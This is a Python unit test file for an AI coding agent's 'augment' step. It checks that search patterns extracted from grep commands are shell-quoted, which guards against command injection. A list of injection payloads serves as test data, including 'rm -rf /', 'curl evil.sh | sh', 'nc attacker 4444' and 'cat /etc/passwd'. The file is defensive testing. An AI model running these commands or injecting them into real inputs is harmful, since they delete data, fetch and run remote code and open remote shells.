"""Tests for GitNexusAgent — focused on shell-safe augmentation (R9)."""
import shlex
import unittest
from unittest.mock import patch

import pytest

# These imports pull in mini-swe-agent + repo modules; skip if unavailable.
gitnexus_agent = pytest.importorskip("agents.gitnexus_agent")
GitNexusAgent = gitnexus_agent.GitNexusAgent
GitNexusMode = gitnexus_agent.GitNexusMode


class _CapturingEnv:
    """Minimal Environment stand-in that records every executed command."""

    def __init__(self):
        self.commands: list[str] = []

    def execute(self, action: dict) -> dict:
        self.commands.append(action.get("command", ""))
        # Benign output: no "[GitNexus]" marker, so _maybe_augment returns None.
        return {"output": ""}


class _NoopModel:
    """Minimal Model stand-in; never invoked by _maybe_augment."""


def _make_augment_agent(env):
    return GitNexusAgent(
        _NoopModel(),
        env,
        gitnexus_mode=GitNexusMode.NATIVE_AUGMENT,
        # Pass templates explicitly so construction never depends on prompt files.
        system_template="sys",
        instance_template="inst",
    )


# Patterns crafted to break out of a naive double-quoted shell argument.
# (e.g. the old `f'gitnexus-augment "{pattern}" ...'` form.)
MALICIOUS_PATTERNS = [
    "$(touch /tmp/pwned)",
    'foo"; rm -rf /; echo "',
    "`id`",
    "x$(reboot)",
    'a" && curl evil.sh | sh #',
    "p | nc attacker 4444",
    "p; cat /etc/passwd",
]


class TestAugmentShellInjection(unittest.TestCase):
    """The augment command must pass the search pattern as a single literal arg."""

    def _augment_command(self, env) -> str:
        """Return the single gitnexus-augment command captured by the env."""
        augment_cmds = [c for c in env.commands if c.startswith("gitnexus-augment")]
        self.assertEqual(
            len(augment_cmds), 1,
            f"expected exactly one augment command, got {env.commands!r}",
        )
        return augment_cmds[0]

    def test_malicious_pattern_is_single_literal_argument(self):
        """Whatever pattern is extracted, it must reach the shell as one token.

        We drive _maybe_augment with the exact untrusted `pattern` (stubbing the
        extractor) because that string is the injection source flowing into the
        env.execute() sink. The command must be the binary + a single shell-quoted
        argument + the intended redirect — nothing the pattern can break out of.
        """
        for pattern in MALICIOUS_PATTERNS:
            with self.subTest(pattern=pattern):
                env = _CapturingEnv()
                agent = _make_augment_agent(env)
                action = {"command": "grep -rn something ."}
                original_output = {"output": "some grep output"}

                with patch.object(GitNexusAgent, "_extract_search_pattern", return_value=pattern):
                    agent._maybe_augment(action, original_output)

                command = self._augment_command(env)

                # Exactly: binary + shell-quoted pattern + the intended redirect.
                expected = f"gitnexus-augment {shlex.quote(pattern)} 2>&1 || true"
                self.assertEqual(command, expected)

                # A shell tokenizes this as [binary, <pattern as ONE token>, 2>&1, ||, true].
                # The pattern introduces no extra command-injecting tokens.
                tokens = shlex.split(command)
                self.assertEqual(tokens[0], "gitnexus-augment")
                self.assertEqual(tokens[1], pattern)
                self.assertEqual(tokens[2:], ["2>&1", "||", "true"])

    def test_end_to_end_via_grep_command_quotes_pattern(self):
        """Realistic path: a grep command's pattern is extracted, then quoted.

        Uses payloads the extractor can recover intact (no embedded quotes) so the
        full extract -> build-command flow is exercised without stubbing.
        """
        recoverable = ["$(touch /tmp/pwned)", "`id`", "x$(reboot)"]
        for pattern in recoverable:
            with self.subTest(pattern=pattern):
                # Sanity: the extractor really yields this exact payload.
                grep_command = f'grep -rn "{pattern}" .'
                self.assertEqual(
                    GitNexusAgent._extract_search_pattern(grep_command), pattern
                )

                env = _CapturingEnv()
                agent = _make_augment_agent(env)
                agent._maybe_augment({"command": grep_command}, {"output": "out"})

                command = self._augment_command(env)
                self.assertEqual(
                    command, f"gitnexus-augment {shlex.quote(pattern)} 2>&1 || true"
                )
                self.assertEqual(shlex.split(command)[1], pattern)

    def test_dangerous_metacharacters_only_inside_single_quotes(self):
        """The raw payload must sit inside a single-quoted region, never bare.

        In the old vulnerable form the payload was interpolated into a *double*-
        quoted argument, leaving $(...), backticks, and ; live to the shell.
        shlex.quote() instead wraps it in single quotes.
        """
        pattern = "$(touch /tmp/pwned)"
        env = _CapturingEnv()
        agent = _make_augment_agent(env)
        with patch.object(GitNexusAgent, "_extract_search_pattern", return_value=pattern):
            agent._maybe_augment({"command": "grep -rn x ."}, {"output": "out"})

        command = self._augment_command(env)
        # Present only inside a single-quoted region.
        self.assertIn(f"'{pattern}'", command)
        # NOT present inside a double-quoted region (the vulnerable form).
        self.assertNotIn(f'"{pattern}"', command)


if __name__ == "__main__":
    unittest.main()
